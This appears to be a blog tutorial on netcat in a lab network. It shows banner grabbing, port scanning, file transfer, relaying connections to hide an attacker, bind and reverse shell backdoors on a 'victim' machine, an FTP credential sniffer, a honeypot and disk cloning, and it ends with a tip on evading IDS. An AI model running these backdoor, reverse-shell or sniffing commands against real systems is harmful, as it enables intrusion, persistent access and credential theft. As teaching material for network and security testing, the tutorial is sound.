@@ -1,0 +1,258 @@
+---
+layout: post
+title: "Network tools - Netcat"
+date: 2014-05-31 00:20:29 +0300
+comments: true
+categories: [netcat, network]
+---
+
+In this tutorial I will cover some of the uses of netcat, known as the "TCP/IP Swiss army knife". Netcat is a very powerful and versatile tool that can be used in diagnosing network problems or in penetration testing.
+<!-- more -->
+
+There are many netcat variations, some are more recent and have been rewritten to include more features. Let's look at the original netcat man page:
+
+> netcat is a simple unix utility which reads and writes data across net-
+> work connections, using TCP or UDP protocol. It is  designed  to  be  a
+> reliable  "back-end" tool that can be used directly or easily driven by
+> other programs and scripts.  At the same time,  it  is  a  feature-rich
+> network  debugging and exploration tool, since it can create almost any
+> kind of connection you would need and has several interesting  built-in
+> capabilities.
+
+Ok, so let's see some of the many ways we can use netcat.
+
+### Banner grabbing
+
+First, let's see what we can glean from using netcat to connect to an FTP server:
+
+``` plain
+nc 192.168.127.130 21
+220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 50 allowed.
+220-Local time is now 17:23. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.
+```
+
+As you can see, there is some information available about the server, including the type of the FTP server, the number of logged in users and the maximum number allowed, the local time of the system, the fact that anonymous logins are disallowed, and that it's possible to connect via IPv6. Depending on the configuration of a server, the information disclosed could be pretty detailed, or sparse and misleading, as to not give away too much info to a potential attacker.
+
+Now let's try banner grabbing from an HTTP server by sending a HEAD request:
+
+``` plain
+nc 192.168.127.130 80
+HEAD / HTTP/1.0
+
+HTTP/1.1 200 OK
+Date: Fri, 21 Feb 2014 17:51:58 GMT
+Server: Apache/2.2.14 (Ubuntu)
+Last-Modified: Tue, 10 May 2011 16:01:46 GMT
+ETag: "27bda-b1-4a2ee12abae80"
+Accept-Ranges: bytes
+Content-Length: 177
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html
+```
+
+This information can vary as well, this time the bit we're interested in is the server version and the operating system. Sometimes there is more to be discovered, like the PHP version that powers the server etc.
+
+### Chat server
+
+Let's now look at how easy it is to use netcat for a very simple chat server.
+
+``` plain
+nc -v -l -p 4444
+listening on [any] 4444 ...
+```
+
+In the above command I told netcat to listen on port 4444. The -v flag is for more verbose output.
+
+Now, from a different terminal window (or machine), connect to that port with netcat and start typing stuff. You will see the output being echoed in the server window. If you type stuff back from the server window, you will see it printed in the client window:
+
+
+{% img center /images/nc_chat.png 'nc_chat' 'chat' %}
+
+
+### File transfer
+
+To transfer files between 2 machines, netcat can be used in the following way. On one computer, let's tell netcat to listen on a port and push a file to the socket:
+
+``` plain
+nc -v -l -p 4444 < confidential.txt
+listening on [any] 4444 ...
+```
+
+Bascially, this takes the file and pushes it on the listening socket, ready to be pulled by a client that connects to that port. Now, from another computer, connect to the listener and redirect whatever you receive to a file:
+
+``` plain
+nc -v 192.168.127.130 4444 > transfer.txt
+192.168.127.130: inverse host lookup failed: Unknown server error : Connection timed out
+(UNKNOWN) [192.168.127.130] 4444 (?) open
+```
+
+Now we can check that we have a new file named transfer.txt which has the same contents as the file that was offered by the server, confidential.txt. Note that netcat doesn't give any indication of the transfer progress or its completion.
+
+### Port scanning
+
+Netcat can also be used as a very basic port scanner:
+
+``` plain
+nc -v -n -z -w1 192.168.127.130 1-1000
+(UNKNOWN) [192.168.127.130] 80 (www) open
+(UNKNOWN) [192.168.127.130] 21 (ftp) open
+```
+
+Here we scanned the range of ports between 1 and 1000 and we determined that ports 21 and 80 are open. The -n switch disables DNS lookup, the -z is for not sending any data, thus reducing the time it requires to talk to the ports. And the -w1 tells netcat to wait 1 second before determining that a connection occurred. This is a TCP only scan. For UDP, add the -u flag.
+
+### Port forwarding
+
+Netcat's port forwarding ability could be useful in a variety of scenarios, from bypassing traffic restrictions in a secure environment to using a proxy (or more) to conduct a MITM attack.
+
+For this example, I will be using the following:
+
+``` plain
+    Attacker machine: 192.168.127.133
+    Relaying machine: 192.168.127.130
+    Victim machine: 192.168.127.129
+```
+
+On the relay, use the following command:
+
+``` plain
+nc -l -p 4444 -c "nc 192.168.127.129 22"
+```
+
+This sets up a listener on port 4444. The -c flag specifies a shell command to be executed by the /bin/sh shell (if the system doesn't have such a shell, you can use the -e flag to execute a command or file instead. On a Windows machine, for instance, you could run cmd.exe or a batch file containing your desired commands). So, in the above, the proxy will forward connections it receives on port 4444 to the victim machine on port 22.
+
+From the attacker machine, connect to the proxy:
+
+``` plain
+nc 192.168.127.130 4444
+SSH-2.0-OpenSSH_5.9
+```
+
+Bingo! We can see that there is an SSH server waiting for someone to log in. On the victim machine, let's confirm that we have a connection:
+
+``` plain
+netstat -antp | grep 22
+tcp        0      0 192.168.127.129:22      192.168.127.130:43583   ESTABLISHED -
+```
+
+So the victim is unaware of the real source of the connection! It sees the connection as originating from the relay machine.
+
+### Remote backdoor - Bind shell
+
+Once an attacker has exploited a victim machine, he may want to return afterwards and have a nice, cozy backdoor waiting for him. If there is a direct connection between the 2 machines, netcat can be used to bind a shell to a port and wait for the attacker to connect. The shell will have the privileges of the user who spawned it, so it's best to have administrative privileges for full power over the system.
+
+On the machine you want to backdoor, use netcat to bind the shell:
+
+``` plain
+nc -v -l -p 5555 -e /bin/bash
+```
+
+Now from another machine, use netcat to connect to it on that port and your shell will be waiting for you. Keep in mind there won't be any prompt or anything like that. Just type commands in the terminal.
+
+{% img center /images/nc_bindshell.png 'nc_bindshell' 'Bind shell' %}
+
+
+### Reverse shell
+
+The more common way to use netcat for backdooring is to spawn a reverse shell that connects back to the atacker. This is useful in case the victim is behind a NAT or in a protected internal network that can't be directly accessed from the internet.
+
+So, let's get on with it and start a listener on the attacking machine:
+
+``` plain
+nc -v -l -n -p 5555
+listening on [any] 5555 ...
+```
+
+Now let's connect from the victim machine:
+
+``` plain
+nc -v -n 192.168.127.130 5555 -e /bin/bash
+(UNKNOWN) [192.168.127.130] 5555 (?) open
+```
+
+Basically, the victim machine sent the attacker a shell, and now we control the victim again. I used the -n switch as well to disable all those pesky inverse lookups.
+
+{% img center /images/nc_reverse.png 'nc_reverse' 'reverse shell' %}
+
+
+### Honeypot
+
+It is possible to set up a very simple honeypot using netcat. I grabbed the banner for the Pure-FTPd server and copied it to a file called banner.txt. Now start listening on port 21 and serve that banner for visitors:
+
+``` plain
+nc -vv -l -n -p 21 < banner.txt | cat > log.txt
+```
+
+The additional -v flag is for extra verbosity and the data received is piped to a log file. Now, from another machine, let's connect to port 21 and see what we get:
+
+{% img center /images/nc_honeypot.png 'nc_honeypot' 'honeypot' %}
+
+
+Here we're seeing the familiar FTP banner even though there's no real FTP server running. We send some random data and now let's check on the other machine that this data has been logged:
+
+{% img center /images/nc_log.png 'nc_log' 'Log output' %}
+
+
+Of course, you might want netcat to keep on listening and not stop after every connection. Consider writing a script for that or look into versions that have continuous connection options.
+
+### Sniffer
+
+Netcat can also be used to sniff traffic from a specific port. One machine has Pure-FTPd running on port 21. On the same machine, we'll use netcat to listen on some other port and execute a script:
+
+``` plain
+nc -l -p 4444 -n -vv -e /root/sniff
+listening on [any] 4444 ...
+```
+
+The script file contains the following:
+
+``` plain
+#!/bin/bash
+nc -o /root/log 192.168.127.130 21
+```
+
+The -o flag is for hex dumping the traffic. This script tells netcat to hex dump the traffic that comes to port 21 and write it to the /root/log file. And on the command line I used netcat to listen on port 4444 and call this script. Now let's try connecting from another machine to the port that netcat listens on:
+
+{% img center /images/nc_ftp.png 'nc_ftp' 'FTP' %}
+
+
+Since this is a test lab and I already knew about the FTP server being sniffed, I tried to log in directly.
+
+Let's check what got logged on the other machine:
+
+*cat /root/log | more*
+
+{% img center /images/nc_hex.png 'nc_hexdump' 'dump' %}
+
+
+There we go! We have a file containing the traffic to port 21, and we can see the attempt to log in has failed with the given credentials. But when a legitimate user will log in, we will have the right username and password.
+
+### Disk cloning
+
+Yes, you can even copy hard disks over the network with netcat, in conjunction with the *dd* program.
+
+On the system that you want to copy from, run this:
+
+``` plain
+dd if=/dev/sda | nc 192.168.127.130 5555
+```
+
+And on the machine you're copying to:
+
+``` plain
+nc -l -p 5555 | dd of=/dev/sda
+```
+
+Be careful when performing operations on hard drives, best to test them on virtual machines first than realizing you just wiped your HDD.
+
+
+I hope by now you realize how powerful netcat can be and its usefulness in a variety of scenarios. Of course, during a real penetration test or uhm, hack attempt, you will probably want to encrypt your traffic with cryptcat or something, since by now, all the IDS vendors are including signatures for netcat. Also, the examples were kept simple for ease of understanding, but in the real world netcat would be chained together with other tools to create complex and stealthy attacks.
+
+> If more of us valued food and cheer and song above hoarded gold, it would
+> be a merrier world.
+> 		-- J.R.R. Tolkien
+ 
